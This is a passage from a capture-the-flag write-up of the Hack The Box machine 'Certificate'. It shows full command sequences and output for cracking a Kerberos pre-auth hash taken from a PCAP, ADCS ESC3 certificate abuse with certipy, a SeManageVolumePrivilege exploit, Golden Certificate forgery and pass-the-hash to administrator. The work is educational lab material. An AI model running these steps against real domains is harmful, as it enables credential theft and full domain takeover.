$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6:Blink182
...[snip]...
$ hashcat web.hashes --show --user -m 3200
sara.b:$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6:Blink182
```

The rest don’t break in reasonable time.

#### Validate Password

This password belongs to sara.b. It does work to log into the website, but nothing seems that different.

sara.b has reused this password on Certificate as well:

```console
oxdf@hacky$ netexec smb dc01.certificate.htb -u sara.b -p Blink182
SMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.71     445    DC01             [+] certificate.htb\sara.b:Blink182
```

They can also WinRM:

```console
oxdf@hacky$ netexec winrm dc01.certificate.htb -u sara.b -p Blink182
WINRM       10.10.11.71     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
WINRM       10.10.11.71     5985   DC01             [+] certificate.htb\sara.b:Blink182 (Pwn3d!)
```

#### WinRM

I’ll use `evil-winrm-py` to get a shell:

```console
oxdf@hacky$ evil-winrm-py -i dc01.certificate.htb -u sara.b -p Blink182
        ▘▜      ▘
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.0.0
[*] Connecting to dc01.certificate.htb:5985 as sara.b
evil-winrm-py PS C:\Users\Sara.B\Documents>
```

## Shell as Lion.SK

### Enumeration

#### Bloodhound

With creds for the first time, I’ll take this opportunity to collect Bloodhound data with `netexec`:

```console
oxdf@hacky$ netexec ldap dc01.certificate.htb -u sara.b -p Blink182 --bloodhound -c ALL --dns-server 10.10.11.71
LDAP        10.10.11.71     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb) (signing:None) (channel binding:Never)
LDAP        10.10.11.71     389    DC01             [+] certificate.htb\sara.b:Blink182
LDAP        10.10.11.71     389    DC01             Resolved collection methods: localadmin, group, trusts, psremote, container, acl, rdp, session, dcom, objectprops
LDAP        10.10.11.71     389    DC01             Done in 0M 18S
LDAP        10.10.11.71     389    DC01             Compressing output into /home/oxdf/.nxc/logs/DC01_10.10.11.71_2025-06-06_174832_bloodhound.zip
```

I’ll start the BloodHound-CE docker, and upload the data.

xamppuser doesn’t have any interesting privileges.

On release, Sara.B was mistakenly left in the Account Operators group, which resulted in a lot of `GenericAll` permissions:

![image-20250606140102920](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606140102920.png)

From here, Sara.B can get user by resetting Lion.SK’s password, or jump ahead to Ryan.K the same way to continue from there.

This was [patched](https://app.hackthebox.com/machines/Certificate/changelog) one week after release (as soon as the box left seasonal competition):

![image-20250930184007063](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250930184007063.png)

Now there’s nothing interesting for Sara.B.

#### Documents

In Sara.B’s `Documents` directory there’s a folder named `WS-01` with two files:

```console
evil-winrm-py PS C:\Users\Sara.B\Documents> ls

    Directory: C:\Users\Sara.B\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/4/2024  12:53 AM                WS-01
evil-winrm-py PS C:\Users\Sara.B\Documents\WS-01> ls

    Directory: C:\Users\Sara.B\Documents\WS-01

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap
```

`Description.txt` has a note:

> The workstation 01 is not able to open the “Reports” smb shared folder which is hosted on DC01. When a user tries to input bad credentials, it returns bad credentials error. But when a user provides valid credentials the file explorer freezes and then crashes!

I’ll download the PCAP:

```console
evil-winrm-py PS C:\Users\Sara.B\Documents\WS-01> download WS-01_PktMon.pcap WS-01_PktMon.pcap
Downloading C:\Users\Sara.B\Documents\WS-01\WS-01_PktMon.pcap: 320kB [00:00, 1.04MB/s]
[+] File downloaded successfully and saved as: /home/oxdf/hackthebox/certificate-10.10.11.71/WS-01_PktMon.pcap
```

### PCAP

I’ll open the PCAP in Wireshark and take a look. There are 33 TCP streams, most of which are over SMB:

![image-20250606114326072](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606114326072.png)

At the bottom there are four streams with TCP 88, which is Kerberos.

### Recover Password

#### NTLMv2 Rabbit Hole

There are SMB ntlmssp authentications in this PCAP, and it’s possible to use the techniques [shown here](https://www.youtube.com/watch?v=lhhlgoMjM7o) to make a NetNTLMv2 “hash” and try to capture it with `hashcat`. This is the local administrator account on WS01, and it doesn’t crack with `rockyou.txt`, which on HTB means it isn’t meant to be cracked.

There’s a tool that will automate pulling this has, [Pcredz](https://github.com/lgandx/PCredz):

```console
oxdf@hacky$ uv run --script Pcredz -f WS-01_PktMon.pcap
Pcredz 2.0.3

Author: Laurent Gaffie <lgaffie@secorizon.com>

This script will extract NTLM (HTTP,LDAP,SMB,MSSQL,RPC, etc), Kerberos,
FTP, HTTP Basic and credit card data from a given pcap file or from a live interface.

CC number scanning activated

Unknown format, trying TCPDump format

protocol: tcp 192.168.56.128:49712 > 192.168.56.101:445
NTLMv2 complete hash is: Administrator::WS-01:0f18018782d74f81:3FF29BA4B51E86ED1065C438B6713F28:01010000000000000588E3DA922EDB012A49D5AAA4EEEA0C00000000020016004300450052005400490046004900430041005400450001000800440043003000310004001E00630065007200740069006600690063006100740065002E006800740062000300280044004300300031002E00630065007200740069006600690063006100740065002E0068007400620005001E00630065007200740069006600690063006100740065002E00680074006200070008000588E3DA922EDB0106000400020000000800300030000000000000000000000000300000DC8F08A3FCED11BE77C988C86F35837E8EC242F6F5E1D65EC5247E3A87D8FE580A001000000000000000000000000000000000000900120063006900660073002F0044004300300031000000000000000000

WS-01_PktMon.pcap parsed in: 0.11 seconds (File size 0.283 Mo).
```

#### Kerberos Authentication

Filtering on `kerberos` shows only 12 packets:

[![image-20250606130530366](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606130530366.png)
*Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606130530366.png)

The first `AS-REQ` doesn’t have any data in it, but the second does:

[![image-20250606132845744](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606132845744.png)
*Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606132845744.png)

The user is Lion.SK, which is a user on Certificate.

[This post](https://medium.com/@business1sg00d/as-req-roasting-from-a-router-2a216c801a2c) talks about how to create a hash that `hashcat` can handle from a PCAP for a Kerberos hash, and the data here lines up exactly with what is in the post.

The hash has 5 parts:

1. “krb5pa”.
2. The encryption type, which is found in the AS-REQ.
3. The username or `CNameString` value.
4. The domain or `realm`.
5. The encrypted timestamp.

These are all in the AS-REQ packet as follows:

[![image-20250606133536459](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606133536459.png)
*Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606133536459.png)

That makes this hash:

```plaintext
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

The only trick here is that I have to add `.htb` to the domain name.

[Krb5RoastParser](https://github.com/jalvarezz13/Krb5RoastParser) will also generate this hash from the PCAP:

```console
oxdf@hacky$ uv run --script krb5_roast_parser.py ../../WS-01_PktMon.pcap as_req
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

#### Crack

I’ll pass this to `hashcat` and it detects the hash mode and cracks it in less than 10 seconds:

```console
$ hashcat lion.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

19900 | Kerberos 5, etype 18, Pre-Auth | Network Protocol
...[snip]...
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
...[snip]...
```

### Shell

#### Verify

This password works for the Lion.SK user for both SMB and WinRM:

```console
oxdf@hacky$ netexec smb DC01.certificate.htb -u lion.sk -p '!QAZ2wsx'
SMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.71     445    DC01             [+] certificate.htb\lion.sk:!QAZ2wsx
oxdf@hacky$ netexec winrm DC01.certificate.htb -u lion.sk -p '!QAZ2wsx'
WINRM       10.10.11.71     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
WINRM       10.10.11.71     5985   DC01             [+] certificate.htb\lion.sk:!QAZ2wsx (Pwn3d!)
```

#### WinRM

I’ll get a shell with `evil-winrm-py`:

```console
oxdf@hacky$ evil-winrm-py -i DC01.certificate.htb -u Lion.SK -p '!QAZ2wsx'
        ▘▜      ▘
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.0.0
[*] Connecting to DC01.certificate.htb:5985 as Lion.SK
evil-winrm-py PS C:\Users\Lion.SK\Documents>
```

And `user.txt`:

```console
evil-winrm-py PS C:\Users\Lion.SK\desktop> cat user.txt
413d8c7e************************
```

## Shell as ryan.k

### Enumeration

#### Bloodhound

Lion.SK is a member of the Domain CRA Managers group, in addition to Domain Users and Remote Management Users:

![image-20250606140312202](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606140312202.png)

CRA is likely Certificate Registration Authority, which strongly suggests ADCS. I could go directly from this to `certipy`, but I’ll upload `SharpHound.exe` (from the “Download Collectors” page in Bloodhound) and collect:

```console
evil-winrm-py PS C:\programdata> upload SharpHound.exe s.exe
Uploading /home/oxdf/hackthebox/certificate-10.10.11.71/SharpHound.exe: 1.25MB [00:04, 292kB/s]
[+] File uploaded successfully as: C:\programdata\s.exe
evil-winrm-py PS C:\programdata> .\s.exe -c all --ZipFileName bh.zip
2025-06-06T19:16:11.3572799-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-06-06T19:16:11.5916537-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2025-06-06T19:16:11.6385316-07:00|INFORMATION|Initializing SharpHound at 7:16 PM on 6/6/2025
2025-06-06T19:16:11.7479086-07:00|INFORMATION|Resolved current domain to certificate.htb
2025-06-06T19:16:11.9197792-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2025-06-06T19:16:12.0604064-07:00|INFORMATION|Beginning LDAP search for certificate.htb
2025-06-06T19:16:12.1541538-07:00|INFORMATION|Beginning LDAP search for certificate.htb Configuration NC
2025-06-06T19:16:12.1854019-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-06-06T19:16:12.1854019-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-06-06T19:16:12.2166508-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for CERTIFICATE.HTB
2025-06-06T19:16:12.2166508-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for CERTIFICATE.HTB
2025-06-06T19:16:12.4666537-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for CERTIFICATE.HTB
2025-06-06T19:16:12.9041522-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for CERTIFICATE.HTB
2025-06-06T19:16:23.4197829-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2025-06-06T19:16:23.4510337-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2025-06-06T19:16:23.6697856-07:00|INFORMATION|Status: 360 objects finished (+360 32.72727)/s -- Using 44 MB RAM
2025-06-06T19:16:23.6697856-07:00|INFORMATION|Enumeration finished in 00:00:11.6305678
2025-06-06T19:16:23.7947818-07:00|INFORMATION|Saving cache with stats: 21 ID to type mappings.
 1 name to SID mappings.
 1 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2025-06-06T19:16:23.8260299-07:00|INFORMATION|SharpHound Enumeration Completed at 7:16 PM on 6/6/2025! Happy Graphing!
```

I believe that `rusthound-ce` would also collect this data (it wasn’t something I was aware of when I solved Certificate). I’ll pull back the data and upload it, and now Lion.SK shows outbound control:

[![image-20250606141751780](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606141751780.png)
*Click for full size image*](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606141751780.png)

Unlike the rest of the Domain Users, they have enroll privileges in the `Delegated-CRA` template.

#### Certipy

I’ll run `certipy` (`uv tool install certipy-ad`) and look for vulnerable templates:

```console
oxdf@hacky$ certipy find -u Lion.SK -p '!QAZ2wsx' -target certificate.htb -ns 10.10.11.71 -vulnerable -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFICATE.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        ManageCertificates              : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Enroll                          : CERTIFICATE.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : Delegated-CRA
    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
```

There’s one CA, Certificate-LTD-CA. There’s one vulnerable template, Delegated-CRA, which is vulnerable to ESC3.

### ESC3

#### Get Enrollment Agent Certificate

The Certipy wiki has a detailed writeup of [exploiting ESC3](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation).

I’ll start by getting an enrollment agent certificate as Lion.SK:

```console
oxdf@hacky$ certipy req -u Lion.SK -p '!QAZ2wsx' -target certificate.htb -ca 'Ce
rtificate-LTD-CA' -template Delegated-CRA
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'
```

I’ll use this to request another certificate on behalf of a target user.

#### Find Template

I want a template that users can enroll in, that’s active, and that is valid for client authentication. From Domain Users, there are five templates that can be enrolled in:

![image-20250606144100487](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606144100487.png)

`EFS` has Authentication Enabled set to False:

![image-20250606144142362](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606144142362.png)

`ClientAuth`, `UserSignature`, and `User` are all disabled (which can be seen running `certipy find` again without the `-vulnerable` flag). That leaves `SignedUser`.

#### Get Administrator Certificate [Fail]

I’ll try to get a certificate as the administrator user:

```console
oxdf@hacky$ certipy req -u Lion.SK -p '!QAZ2wsx' -target certificate.htb -ca 'Certificate-LTD-CA' -template SignedUser -on-behalf-of 'CERTIFICATE\administrator' -pfx lion.sk.pfx
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 25
[-] Got error while requesting certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.
```

It fails because it requires an email subject. That’s in the template `Certificate Name Flags`:

![image-20250606144519988](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606144519988.png)

The administrator user doesn’t have one set:

```console
oxdf@hacky$ GetADUsers.py certificate.htb/Lion.SK:'!QAZ2wsx' -all
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Querying certificate.htb for information about domain.
Name                  Email                           PasswordLastSet      LastLogon
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2025-04-28 21:33:46.958071  2025-06-06 22:05:30.310402
Guest                                                 <never>              <never>
krbtgt                                                2024-11-03 09:24:32.914665  <never>
Kai.X                 kai.x@certificate.htb           2024-11-04 00:18:06.346088  2024-11-24 06:36:30.608468
Sara.B                sara.b@certificate.htb          2024-11-04 02:01:09.188915  2024-12-27 06:01:28.460147
John.C                john.c@certificate.htb          2024-11-04 02:16:41.190022  <never>
Aya.W                 aya.w@certificate.htb           2024-11-04 02:17:43.642034  <never>
Nya.S                 nya.s@certificate.htb           2024-11-04 02:18:53.829718  <never>
Maya.K                maya.k@certificate.htb          2024-11-04 02:20:01.657941  <never>
Lion.SK               lion.sk@certificate.htb         2024-11-04 02:28:02.471452  2024-11-04 08:24:08.500719
Eva.F                 eva.f@certificate.htb           2024-11-04 02:33:36.752043  <never>
Ryan.K                ryan.k@certificate.htb          2024-11-04 02:57:30.939423  2024-11-27 02:48:21.040389
akeder.kh                                             2024-11-24 02:26:06.813668  2024-11-24 02:51:49.735026
kara.m                                                2024-11-24 02:28:19.142081  <never>
Alex.D                alex.d@certificate.htb          2024-11-24 06:47:44.514001  2024-11-24 06:48:05.703180
karol.s                                               2024-11-24 02:42:21.125611  <never>
saad.m                saad.m@certificate.htb          2024-11-24 02:44:23.532500  <never>
xamppuser                                             2024-12-29 09:42:04.121622  2025-06-06 02:27:40.279166
```

#### Identify User

None of the remaining users have any direct paths to important things. I’ll look through each user that I don’t already control who has an email address for their groups.

- Kai.X - Marketing
- John.C, Aya.W, Saad.M - Helpdesk - In the WinRM / RDP groups.
- Nya.S - HR
- Maya.K - Finance
- Eva.F, Alex.D - Domain CRA Managers
- Ryan.K - Domain Storage Managers

The most interesting is Domain Storage Managers, as they may have some direct disk access:

```console
evil-winrm-py PS C:\> net group 'Domain Storage Managers'

Group name     Domain Storage Managers
Comment        The members of this security group are responsible for volume-level tasks such as maintaining, defragmenting and managing partitions and disks.

Members

-------------------------------------------------------------------------------
Ryan.K
The command completed successfully.
```

#### Get Auth

I’ll request a certificate for Ryan.K using the delegated certificate:

```console
oxdf@hacky$ certipy req -u Lion.SK -p '!QAZ2wsx' -target certificate.htb -ca 'Certificate-LTD-CA' -template SignedUser -on-behalf-of 'CERTIFICATE\ryan.k' -pfx lion.sk.pfx
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 27
[*] Successfully requested certificate
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'
```

This time it works. I’ll use it to `auth`:

```console
oxdf@hacky$ certipy auth -pfx ryan.k.pfx -dc-ip 10.10.11.71
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```

That NTLM should be enough to auth wherever I need to.

### WinRM

Ryan.K is in the Remote Management Users group, which means they can WinRM. I’ll connect with `evil-winrm-py`:

```console
oxdf@hacky$ evil-winrm-py -i DC01.certificate.htb -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6
        ▘▜      ▘
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.0.0
[*] Connecting to DC01.certificate.htb:5985 as ryan.k
evil-winrm-py PS C:\Users\Ryan.K\Documents>
```

## Shell as Administrator

### Enumeration

Ryan.K has an interesting privilege:

```console
evil-winrm-py PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

According to the [Microsoft docs](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges), `SeManageVolumePrivilege`:

> allows specific volume-level management operations, such as lock volume, defragmenting, volume dismount, and setting valid data length on Windows XP and later. A file system driver explicitly enforces this particular privilege primarily based on FSCTL operations. In this case, the file system makes a policy decision to enforce this privilege. The determination of whether this privilege is held by the caller is made by the security reference monitor as part of the normal privilege check.

### Exploit

[This video](https://www.youtube.com/watch?v=gVLoHAl-8Z0) from Grzegorz Tworek goes into really nice detail about how to abuse the `SeManageVolumePrivilege`. Basically, the privilege provides direct access to the disk, which has intended things to modify, but also there are a lot of undocumented things that can be modified.

There’s a project on GitHub from CsEnox, [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit), which abuses this to replace all the S-1-5-32-544 (Administrators group) ACL rights on C: with S-1-5-32-545 (Users group).

I’ll upload this and run it:

```console
*Evil-WinRM* PS C:\programdata> upload SeManageVolumeExploit.exe SeManageVolumeExploit.exe
Uploading /home/oxdf/hackthebox/certificate-10.10.11.71/SeManageVolumeExploit.exe: 100%|█| 12.0k/12.0k [00:00<00:0
[+] File uploaded successfully as: C:\programdata\SeManageVolumeExploit.exe
evil-winrm-py PS C:\programdata> .\SeManageVolumeExploit.exe
Entries changed: 842
DONE
```

Now Ryan.K can go to the administrator user’s desktop and see the files:

```console
*Evil-WinRM* PS C:\users\administrator\desktop> ls

    Directory: C:\users\administrator\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/23/2024   6:55 PM             70 root.txt
```

But the flag can’t be read:

```console
*Evil-WinRM* PS C:\users\administrator\desktop> type root.txt
Access to the path 'C:\users\administrator\desktop\root.txt' is denied.
At line:1 char:1
+ type root.txt
+ ~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\users\administrator\desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

It’s encrypted with EFS (as indicated by the “E” next to the file name):

```console
*Evil-WinRM* PS C:\users\administrator\desktop> cipher /c root.txt

 Listing C:\users\administrator\desktop\
 New files added to this directory will be encrypted.

E root.txt
  Compatibility Level:
    Windows Vista/Server 2008

cipher.exe : Access is denied.
    + CategoryInfo          : NotSpecified: (Access is denied.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Access is denied.  Key information cannot be retrieved.

Access is denied.
```

### GoldenCertificate

There are a lot of ways to exploit from here. Given the hotness of ADCS lately, I’ll do a Golden Certificate attack, which is basically compromising the CA’s private key.

I’ll get the serial number for the CA from the `certipy find` output above, and export it using `certutil` as described [on Super User](https://superuser.com/questions/946594/how-to-use-certutil-exportpfx-to-export-certificates-from-certifiate-enrollmen):

```console
*Evil-WinRM* PS C:\programdata> certutil -exportPFX 75b2f4bbf31f108945147b466131bdca .\ca.pfx
MY "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file .\ca.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
```

I’ll download that to my host:

```console
*Evil-WinRM* PS C:\programdata> download ca.pfx

Info: Downloading C:\programdata\ca.pfx to ca.pfx

Info: Download successful!
```

I’ll use it to forge a certificate as administrator:

```console
oxdf@hacky$ certipy forge -ca-pfx ca.pfx -upn Administrator@certificate.htb -subject 'CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'administrator_forged.pfx'
[*] Wrote forged certificate and private key to 'administrator_forged.pfx'
```

And then `auth` with that:

```console
oxdf@hacky$ certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.11.71
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

This gives both a Kerberos ticket and the NTLM hash.

### Shell

I’ll use that NTLM to auth and get a shell:

```console
oxdf@hacky$ evil-winrm -i DC01.certificate.htb -u administrator -H d804304519bf0143c14cbf1c024408c6

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

And grab the root flag:

```console
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
a2ad9d89************************
```
